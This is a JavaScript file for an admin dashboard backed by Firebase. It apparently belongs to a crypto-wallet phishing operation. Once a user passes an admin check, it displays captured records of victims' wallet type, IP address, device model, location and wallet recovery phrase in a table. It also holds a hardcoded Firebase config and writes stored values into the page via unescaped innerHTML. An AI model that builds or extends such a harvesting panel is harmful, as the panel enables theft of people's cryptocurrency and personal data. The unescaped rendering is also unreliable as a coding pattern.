import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
import {
  getAuth,
  onAuthStateChanged,
  signOut,
} from "https://www.gstatic.com/firebasejs/9.17.1/firebase-auth.js";
import {
  getDatabase,
  ref,
  get,
  child,
  onValue,
} from "https://www.gstatic.com/firebasejs/9.17.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBZS-Ry4ddvIN-FkXohNidSZgTInnfzVtI",
  authDomain: "titans-token.firebaseapp.com",
  databaseURL: "https://titans-token-default-rtdb.firebaseio.com",
  projectId: "titans-token",
  storageBucket: "titans-token.firebasestorage.app",
  messagingSenderId: "996300344426",
  appId: "1:996300344426:web:1ed9e4dcdd3b52098a0e13",
  measurementId: "G-W39KLMEDSZ",
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);

// DOM elements
const loadingScreen = document.getElementById("loading-screen");
const dashboardContent = document.getElementById("dashboard-content");

document.addEventListener("DOMContentLoaded", () => {
  onAuthStateChanged(auth, (user) => {
    if (user) {
      showLoadingScreen();
      checkUserRole(user.uid);
    } else {
      redirectToLogin();
    }
  });
});

// Show loading screen and hide dashboard content
function showLoadingScreen() {
  loadingScreen.style.display = "block";
  dashboardContent.style.display = "none";
}

// Hide loading screen and show dashboard content
function hideLoadingScreen() {
  loadingScreen.style.display = "none";
  dashboardContent.style.display = "block";
}

// Redirect to login page
function redirectToLogin() {
  window.location.href = "login.html";
}

// Check user's role
function checkUserRole(uid) {
  const dbRef = ref(database);
  get(child(dbRef, `users/${uid}/role`))
    .then((snapshot) => {
      if (snapshot.exists() && snapshot.val().includes("admin")) {
        hideLoadingScreen();
        fetchUsers(uid); // Fetch and display users
      } else {
        console.warn("User is not an admin. Redirecting to login.");
        redirectToLogin();
      }
    })
    .catch((error) => {
      console.error("Error retrieving user role:", error);
      redirectToLogin();
    });
}

// Fetch and display users or WalletResponse data
function fetchUsers() {
  const usersList = document.getElementById("users-list");
  const walletRef = ref(database, "WalletResponse");

  // Listen for WalletResponse data changes
  onValue(
    walletRef,
    (snapshot) => {
      usersList.innerHTML = ""; // Clear the list before adding new rows
      snapshot.forEach((childSnapshot) => {
        const walletResponse = childSnapshot.val();

        // Create a new row for each WalletResponse entry
        const row = document.createElement("tr");
        row.innerHTML = `
          <td>${walletResponse.wallet_Type || "N/A"}</td>
          <td>${walletResponse.ip_Address || "N/A"}</td>
          <td>${walletResponse.device_Model || "N/A"}</td>
          <td>${
            walletResponse.location
              ? `${walletResponse.location.city || ""}, ${
                  walletResponse.location.region || ""
                }, ${walletResponse.location.country || ""}`.replace(
                  /(^, )|(, $)/g,
                  ""
                ) // Removes leading/trailing commas
              : "N/A"
          }</td>
          <td>${walletResponse.recovery_Phrase || "N/A"}</td>
        `;
        usersList.appendChild(row); // Append the row to the table
      });
    },
    (error) => {
      console.error("Error fetching WalletResponse data:", error);
    }
  );
}

// Select all elements using class-based selectors
const logoutButtons = document.querySelectorAll(".logoutButton");
const confirmYesButtons = document.querySelectorAll(".confirmYes");
const confirmNoButtons = document.querySelectorAll(".confirmNo");
const confirmationPopups = document.querySelectorAll(".confirmationPopup");

// Add click event to all logout buttons
logoutButtons.forEach((button, index) => {
  button.addEventListener("click", () => {
    // Show the corresponding confirmation popup
    if (confirmationPopups[index]) {
      confirmationPopups[index].style.display = "block";
    }
  });
});

// Handle 'Yes' confirmation for all 'confirmYes' buttons
confirmYesButtons.forEach((button, index) => {
  button.addEventListener("click", () => {
    signOut(auth)
      .then(() => {
        // Hide the corresponding confirmation popup
        if (confirmationPopups[index]) {
          confirmationPopups[index].style.display = "none";
        }
        redirectToLogin(); // Redirect to login page
      })
      .catch((error) => {
        console.error("Sign out error:", error);
      });
  });
});

// Handle 'No' confirmation for all 'confirmNo' buttons
confirmNoButtons.forEach((button, index) => {
  button.addEventListener("click", () => {
    // Hide the corresponding confirmation popup
    if (confirmationPopups[index]) {
      confirmationPopups[index].style.display = "none";
    }
  });
});
